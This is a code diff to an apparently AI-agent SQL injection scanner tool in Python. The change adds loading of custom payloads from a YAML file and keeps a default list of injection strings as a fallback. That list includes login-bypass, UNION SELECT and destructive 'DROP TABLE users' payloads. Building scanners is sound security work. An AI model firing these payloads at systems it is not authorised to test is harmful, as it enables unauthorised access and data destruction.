@@ -7,6 +7,8 @@ import re
 import time
 import logging
 import random
+import os
+import yaml
 
 class SQLInjectionScannerToolInput(BaseModel):
     """Input schema for SQLInjectionScannerTool."""
@@ -22,27 +24,53 @@ class SQLInjectionScannerTool(BaseTool):
 
     def _run(self, target_url: str, entry_points: List[Dict[str, Any]]) -> str:
         try:
-            # Basic SQL injection payloads for testing
-            basic_payloads = [
-                "' OR '1'='1", 
-                "\" OR \"1\"=\"1",
-                "' OR 1=1 --",
-                "\" OR 1=1 --",
-                "' OR '1'='1' --",
-                "admin' --",
-                "1' OR '1' = '1",
-                "1\" OR \"1\" = \"1",
-                "' UNION SELECT 1,2,3 --",
-                "' UNION SELECT NULL,NULL,NULL --",
-                "1; DROP TABLE users --",
-                "1'; DROP TABLE users --",
-                "' OR 1=1 #",
-                "\" OR 1=1 #",
-                "' OR '1'='1' /*",
-                "' OR 1=1 LIMIT 1 --",
-                "') OR ('1'='1",
-                "\") OR (\"1\"=\"1"
-            ]
+            # Check if custom payloads file exists and load payloads from it
+            custom_payloads = []
+            custom_payloads_file = "custom_payloads.yaml"
+            try:
+                if os.path.exists(custom_payloads_file):
+                    print(f"Found custom payloads file: {custom_payloads_file}")
+                    with open(custom_payloads_file, 'r') as file:
+                        yaml_content = yaml.safe_load(file)
+                        if yaml_content and 'payloads' in yaml_content and yaml_content['payloads']:
+                            custom_payloads = yaml_content['payloads']
+                            print(f"Loaded {len(custom_payloads)} custom payloads for SQL vulnerability scanning")
+                            if len(custom_payloads) > 0:
+                                print(f"First custom payload: {custom_payloads[0]}")
+                        else:
+                            print("Custom payloads file exists but contains no payloads or has invalid format")
+                else:
+                    print(f"No custom payloads file found at: {custom_payloads_file}")
+            except Exception as e:
+                print(f"Error loading custom payloads: {str(e)}")
+            
+            # Basic SQL injection payloads for testing - use custom payloads if available
+            if custom_payloads:
+                print(f"Using {len(custom_payloads)} custom payloads for SQL injection testing")
+                basic_payloads = custom_payloads
+            else:
+                # Default payloads if no custom ones are provided
+                basic_payloads = [
+                    "' OR '1'='1", 
+                    "\" OR \"1\"=\"1",
+                    "' OR 1=1 --",
+                    "\" OR 1=1 --",
+                    "' OR '1'='1' --",
+                    "admin' --",
+                    "1' OR '1' = '1",
+                    "1\" OR \"1\" = \"1",
+                    "' UNION SELECT 1,2,3 --",
+                    "' UNION SELECT NULL,NULL,NULL --",
+                    "1; DROP TABLE users --",
+                    "1'; DROP TABLE users --",
+                    "' OR 1=1 #",
+                    "\" OR 1=1 #",
+                    "' OR '1'='1' /*",
+                    "' OR 1=1 LIMIT 1 --",
+                    "') OR ('1'='1",
+                    "\") OR (\"1\"=\"1"
+                ]
+                print("Using default SQL injection payloads")
             
             # Error-based payloads to help identify database type
             db_fingerprint_payloads = {
@@ -79,6 +107,7 @@ class SQLInjectionScannerTool(BaseTool):
                 location = entry_point.get('location', '')
                 parameter = entry_point.get('parameter', '')
                 
+                print(f"Testing entry point: {entry_type} at {location} with parameter {parameter}")
                 result = self._test_entry_point(
                     target_url, entry_type, location, parameter, 
                     basic_payloads, db_fingerprint_payloads
